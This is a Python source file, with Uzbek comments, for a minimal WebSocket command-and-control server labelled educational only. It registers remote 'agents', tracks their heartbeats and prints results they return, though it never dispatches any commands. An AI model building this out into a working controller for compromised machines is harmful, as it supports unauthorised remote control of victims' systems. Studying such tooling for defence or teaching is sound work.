"""
WebSocket C2 Server
Real-time bidirectional aloqa
"""

import asyncio
import websockets
import json
from datetime import datetime
import sys
import os

sys.path.append(os.path.join(os.path.dirname(__file__), '..'))


class WebSocketC2Server:
    """WebSocket C2 Server"""
    
    def __init__(self, host='0.0.0.0', port=8765):
        self.host = host
        self.port = port
        self.agents = {}
        self.running = False
        
    async def handler(self, websocket, path):
        """WebSocket ulanish boshqaruvi"""
        agent_id = None
        client_addr = websocket.remote_address
        
        try:
            print(f"[{datetime.now().strftime('%H:%M:%S')}] 🔌 WebSocket ulanish: {client_addr[0]}:{client_addr[1]}")
            
            async for message in websocket:
                data = json.loads(message)
                
                # Agent registration
                if data.get('type') == 'register':
                    agent_id = data.get('agent_id')
                    self.agents[agent_id] = {
                        'websocket': websocket,
                        'address': client_addr,
                        'first_seen': datetime.now(),
                        'last_seen': datetime.now(),
                        'messages': 0
                    }
                    print(f"[{datetime.now().strftime('%H:%M:%S')}] 🆕 Agent ro'yxatdan o'tdi: {agent_id}")
                    
                    # Send confirmation
                    await websocket.send(json.dumps({
                        'status': 'registered',
                        'agent_id': agent_id
                    }))
                    
                # Heartbeat
                elif data.get('type') == 'heartbeat':
                    agent_id = data.get('agent_id')
                    if agent_id in self.agents:
                        self.agents[agent_id]['last_seen'] = datetime.now()
                        self.agents[agent_id]['messages'] += 1
                        
                        await websocket.send(json.dumps({
                            'status': 'ok',
                            'commands': []
                        }))
                        
                # Command result
                elif data.get('type') == 'result':
                    agent_id = data.get('agent_id')
                    result = data.get('data')
                    print(f"[{agent_id}] 📥 Natija: {result}")
                    
        except websockets.exceptions.ConnectionClosed:
            if agent_id and agent_id in self.agents:
                print(f"[{datetime.now().strftime('%H:%M:%S')}] ❌ Agent uzildi: {agent_id}")
                del self.agents[agent_id]
        except Exception as e:
            print(f"❌ WebSocket xatosi: {e}")
            
    async def start_server(self):
        """WebSocket server ishga tushirish"""
        print(f"\n{'='*50}")
        print(f"🎯 WebSocket C2 Server")
        print(f"⚠️  Faqat ta'lim maqsadida!")
        print(f"{'='*50}")
        print(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] 🚀 WebSocket Server: {self.host}:{self.port}")
        print(f"\n📊 Server ishga tushdi...")
        print(f"🌐 WebSocket URL: ws://{self.host}:{self.port}")
        print(f"{'-'*50}\n")
        
        self.running = True
        
        async with websockets.serve(self.handler, self.host, self.port):
            # Keep server running
            while self.running:
                await asyncio.sleep(1)
                
    def stop(self):
        """Serverni to'xtatish"""
        print("\n🛑 WebSocket Server to'xtatilmoqda...")
        self.running = False
        print("✅ WebSocket Server to'xtatildi")


async def cli_loop(server):
    """CLI loop"""
    while server.running:
        try:
            # Non-blocking input simulation
            await asyncio.sleep(1)
            
        except KeyboardInterrupt:
            server.stop()
            break


def main():
    server = WebSocketC2Server(host='0.0.0.0', port=8765)
    
    try:
        asyncio.run(server.start_server())
    except KeyboardInterrupt:
        print("\n🛑 Ctrl+C bosildi, to'xtatilmoqda...")
        server.stop()


if __name__ == "__main__":
    main()
